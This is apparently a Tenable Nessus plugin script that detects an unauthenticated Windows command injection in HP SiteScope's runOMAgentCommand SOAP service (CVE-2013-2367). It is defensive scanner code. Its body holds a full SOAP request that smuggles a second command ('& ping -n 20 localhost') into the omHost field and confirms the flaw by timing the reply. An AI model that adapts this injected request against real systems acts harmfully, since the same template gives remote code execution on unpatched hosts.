#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(69983);
  script_version("$Revision: 1.12 $");
  script_cvs_date("$Date: 2016/12/21 22:04:46 $");

  script_cve_id("CVE-2013-2367");
  script_bugtraq_id(61506);
  script_osvdb_id(95824);

  script_name(english:"HP SiteScope SOAP Call runOMAgentCommand SOAP Request Arbitrary Remote Code Execution");
  script_summary(english:"Tries to issue runOMAgentCommand SOAP call");

  script_set_attribute(
    attribute:"synopsis",
    value:
"A web application on the remote host has a Windows command injection
vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of HP SiteScope hosted on the remote web server has a
Windows command injection vulnerability.  The application hosts a web
service that allows the runOMAgentCommand() method to be invoked without
authentication.  A remote, unauthenticated attacker could exploit this
to run arbitrary Windows commands."
  );
  script_set_attribute(attribute:"see_also", value:"http://www.zerodayinitiative.com/advisories/ZDI-13-205/");
  # http://h20565.www2.hpe.com/hpsc/doc/public/display?docId=emr_na-c03861260-1
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?a64e5c5e");
  script_set_attribute(attribute:"solution", value:"Upgrade to HP SiteScope 11.22 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"HP SiteScope runOMAgentCommand 11.20 RCE");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'HP SiteScope Remote Code Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'D2ExploitPack');

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/07/29");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/07/29");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/09/19");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:hp:sitescope");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2016 Tenable Network Security, Inc.");

  script_dependencies("hp_sitescope_detect.nasl", "os_fingerprint.nasl");
  script_require_keys("www/sitescope");
  script_require_ports("Services/www", 8080);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:8080);
install = get_install_from_kb(appname:'sitescope', port:port, exit_on_fail:TRUE);

# We don't test for non-Windows
if (report_paranoia < 2)
{
  os = get_kb_item_or_exit('Host/OS');
  if ('Windows' >!< os) exit(0, 'This plugin does not run against a non-Windows host.');
}

http_disable_keep_alive();
hdr = make_array('SOAPAction', '""');
url = install['dir'] + '/services/APIBSMIntegrationImpl';

# Our injected command will consume <delay> seconds run time
delay = 20;

xml = '<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope
 xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
 xmlns:xsd="http://www.w3.org/2001/XMLSchema"
 xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <soapenv:Body>
    <ns1:runOMAgentCommand
     soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"
     xmlns:ns1="http://Api.freshtech.COM">
        <properties href="#id0"/>
        <command xsi:type="xsd:string">OPCACTIVATE</command>
    </ns1:runOMAgentCommand>
    <multiRef id="id0"
      soapenc:root="0"
      soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"
      xsi:type="ns2:Map"
      xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/"
      xmlns:ns2="http://xml.apache.org/xml-soap">
        <item>
          <key xsi:type="soapenc:string">omHost</key>
          <value xsi:type="soapenc:string">&quot;127.0.0.1 &amp; ping -n ' + delay + ' localhost&quot;</value>
        </item>
    </multiRef>
  </soapenv:Body>
</soapenv:Envelope>';

# This plugin causes remote host to run:
# 1) cscript.exe C:\Program Files\HP\HP BTO Software\bin\OpC\install\opactivate.vbs
# 2) and the Windows command(s) we injected
#
# The remote server does not return an HTTP response until these programs return.
# On a host with HP Operations Agent installed, if the "OpenView Ctrl Service" is not started,
# the opactivate.vbs script will try to start the service, this can take some time (seen > 30 seconds)
#
# The run time for opcactivate.vbs may not be deterministic.
# Here we set a reasonably long timeout so that we can get a response
http_set_read_timeout(150 + delay);

#
# It seems the affected version is vulnerable only if HP Operations Agent is installed.
# The Agent installation is part of HP SiteScope installation, and by default is not installed.
#
# When the Agent is not installed, C:\Program Files\HP\HP BTO Software\bin\OpC\install\opactivate.vbs is not present,
# and our injected command is not run. In this case, the response time for the POST request is significantly faster.
#
# The vulnerable server will take at least <delay> seconds to respond.
#
#
for (i = 0; i < 2; i++)
{
  t1 = unixtime();
  res = http_send_recv3(
    method:'POST',
    item:url,
    port:port,
    data:xml,
    add_headers:hdr,
    content_type:'text/xml; charset=utf-8',
    exit_on_fail:TRUE
  );
  t2 = unixtime();
  resp_time = t2 - t1;

  # No response
  if (isnull(res[0])) audit(AUDIT_RESP_NOT, port);

  # Missing response body
  if (isnull(res[2])) audit(AUDIT_RESP_BAD, port);

  # Non-affected version returns HTTP status code 500
  if (res[0] =~ '^HTTP/[0-9]+\\.[0-9]+ 500') audit(AUDIT_WEB_APP_NOT_AFFECTED, 'SiteScope', build_url(qs:install['dir'], port:port));

  # Unexpected response
  # Vulnerable version should return status 200 and contain 'runOMAgentCommandResponse' in the response body
  if (! (res[0] =~ '^HTTP/[0-9]+\\.[0-9]+ 200' && res[2] =~ 'runOMAgentCommandResponse')) audit(AUDIT_RESP_BAD, port);

  # Faster response
  # HP Operations Agent likely not installed and thus not vulnerable
  if (resp_time < delay) audit(AUDIT_WEB_APP_NOT_AFFECTED, 'SiteScope', build_url(qs:install['dir'], port:port));

  # Wait a bit before next trial run
  sleep(1);
}

report = NULL;
if (report_verbosity > 0)
{
  snip =  crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);
  report = 'Nessus was able to verify the vulnerability with the following request :\n' +
           snip + '\n' +
           http_last_sent_request() + '\n' +
           snip;
}
# Server takes at least <delay> seconds to respond for each of the several requests; likely vulnerable
security_hole(port:port, extra:report);
